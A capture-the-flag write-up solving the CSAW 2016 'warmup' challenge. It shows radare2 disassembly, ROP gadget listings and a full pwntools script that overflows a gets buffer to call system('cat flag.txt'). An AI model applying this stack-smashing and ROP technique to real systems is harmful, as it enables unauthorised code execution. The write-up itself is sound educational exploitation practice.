# Pwn50 "warmup"

## The direct approach (with the benefit of hindsight)

Warmup is a pretty simple `x86_64` exploitation challenge.

```
$ file warmup
warmup: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=ab209f3b8a3c2902e1a2ecd5bb06e258b45605a4, not stripped
```

Looking at it in `r2`, it's easy to see that it leaks an address in the binary (`sym.easy`), and then calls `gets` on a stack-allocated buffer.
```
$ r2 warmup
[0x00400520]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[*] Use -AA or aaaa to perform additional experimental analysis.
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[0x00400520]> s main
[0x0040061d]> pdf
            ;-- main:
╒ (fcn) sym.main 136
│           ; var int local_40h @ rbp-0x40
│           ; var int local_80h @ rbp-0x80
│           ; DATA XREF from 0x0040053d (sym.main)
│           0x0040061d      55             pushq %rbp
│           0x0040061e      4889e5         movq %rsp, %rbp
│           0x00400621      4883c480       addq $-0x80, %rsp
│           0x00400625      ba0a000000     movl $0xa, %edx
│           0x0040062a      be41074000     movl $str._Warm_Up__n, %esi ; "-Warm Up-." @ 0x400741
│           0x0040062f      bf01000000     movl $1, %edi
│           0x00400634      e887feffff     callq sym.imp.write
│           0x00400639      ba04000000     movl $4, %edx
│           0x0040063e      be4c074000     movl $str.WOW:, %esi        ; "WOW:" @ 0x40074c
│           0x00400643      bf01000000     movl $1, %edi
│           0x00400648      e873feffff     callq sym.imp.write
│           0x0040064d      488d4580       leaq -0x80(%rbp), %rax
│           0x00400651      ba0d064000     movl $sym.easy, %edx        ; "UH...4.@" @ 0x40060d
│           0x00400656      be51074000     movl $0x400751, %esi
│           0x0040065b      4889c7         movq %rax, %rdi
│           0x0040065e      b800000000     movl $0, %eax
│           0x00400663      e8a8feffff     callq sym.imp.sprintf
│           0x00400668      488d4580       leaq -0x80(%rbp), %rax
│           0x0040066c      ba09000000     movl $9, %edx
│           0x00400671      4889c6         movq %rax, %rsi
│           0x00400674      bf01000000     movl $1, %edi
│           0x00400679      e842feffff     callq sym.imp.write
│           0x0040067e      ba01000000     movl $1, %edx
│           0x00400683      be55074000     movl $0x400755, %esi
│           0x00400688      bf01000000     movl $1, %edi
│           0x0040068d      e82efeffff     callq sym.imp.write
│           0x00400692      488d45c0       leaq -0x40(%rbp), %rax
│           0x00400696      4889c7         movq %rax, %rdi
│           0x00400699      b800000000     movl $0, %eax
│           0x0040069e      e85dfeffff     callq sym.imp.gets
│           0x004006a3      c9             leave
╘           0x004006a4      c3             retq
[0x0040061d]> f~easy
0x0040060d 16 sym.easy
```

There are no canaries, and `system` is already included in the PLT:
```
[0x0040061d]> ii
[Imports]
ordinal=001 plt=0x004004c0 bind=GLOBAL type=FUNC name=write
ordinal=002 plt=0x004004d0 bind=GLOBAL type=FUNC name=system
ordinal=003 plt=0x004004e0 bind=GLOBAL type=FUNC name=__libc_start_main
ordinal=004 plt=0x004004f0 bind=UNKNOWN type=NOTYPE name=__gmon_start__
ordinal=005 plt=0x00400500 bind=GLOBAL type=FUNC name=gets
ordinal=006 plt=0x00400510 bind=GLOBAL type=FUNC name=sprintf

6 imports
```

There's also a command to pass already included as a string in the binary:
```
[0x0040061d]> iz
vaddr=0x00400734 paddr=0x00000734 ordinal=000 sz=13 len=12 section=.rodata type=ascii string=cat flag.txt
vaddr=0x00400741 paddr=0x00000741 ordinal=001 sz=11 len=10 section=.rodata type=ascii string=-Warm Up-\n
vaddr=0x0040074c paddr=0x0000074c ordinal=002 sz=5 len=4 section=.rodata type=ascii string=WOW:
```

On `x86_64`, the calling convention is to pass arguments in registers (first rdi, then rsi, then rdx, and so on). In order to invoke `system("cat flag.txt")` from the stack smash, we need to get `0x00400734` (the address of "cat flag.txt") into rdi, and then return to `0x004004d0` (system's PLT entry).

`ROPgadget` is a convenient way to get some helper addresses:
```
$ ROPgadget --binary warmup | grep ': pop rdi\|: ret'
0x0000000000400713 : pop rdi ; ret
0x00000000004004a1 : ret
0x0000000000400595 : ret 0xc148
```

There's a neat trick to avoid caring about the exact offset that system goes into, and that is to use the address of a `ret` instruction as a kind of nop-sled. The start of main subtracts 0x80 from the stack, so I round up to 0xa0 as something large enough to be sure to overwrite the return address, but small enough to not go out-of-bounds for the mapped segment.

Throwing it all together with the `pwntools` Python library:

```
from pwn import *
import struct

p = process('./warmup') if '--live' not in sys.argv else remote('pwn.chal.csaw.io', 8000)

print(p.recvregex('WOW:'))
r = '0x([0-9a-f]*)\n'
easy_offset = 0x40060d
easy_leak = int(re.findall(r, p.recvregex(r))[0], 16)

print('easy_leak: %r' % (easy_leak,))
base_delta = easy_leak - 0x40060d
print('base_delta: %r' % (base_delta,))

ret = struct.pack('<Q', 0x00000000004004a1)
poprdi = struct.pack('<Q', 0x0000000000400713)
catflag = struct.pack('<Q', 0x400730+4)
system = struct.pack('<Q', 0x00000000004004d0)
p.sendline(ret*(0xa0/8) + poprdi + catflag + system)

print p.recvall()
```

This yields us the flag:
```
$ ./pwn50_warmup_exploit.cleaned.py --live
[+] Opening connection to pwn.chal.csaw.io on port 8000: Done
-Warm Up-
WOW:
easy_leak: 4195853
base_delta: 0
[+] Recieving all data: Done (30B)
[*] Closed connection to pwn.chal.csaw.io port 8000
>FLAG{LET_US_BEGIN_CSAW_2016}
```

## Detours I took (without the benefit of hindsight)
I didn't initially use r2's strings command to find the `cat flag.txt` string in the binary. I was looking for the strings `ed` and `sh` in `objdump -s warmup`'s output, in order to get a shell. I didn't find either, but I did notice the `cat flag.txt` string during that.

Also, the using the leak turned out to be unnecessary, as the binary wasn't compiled as position independent (hence `base_delta` evaluating to 0).
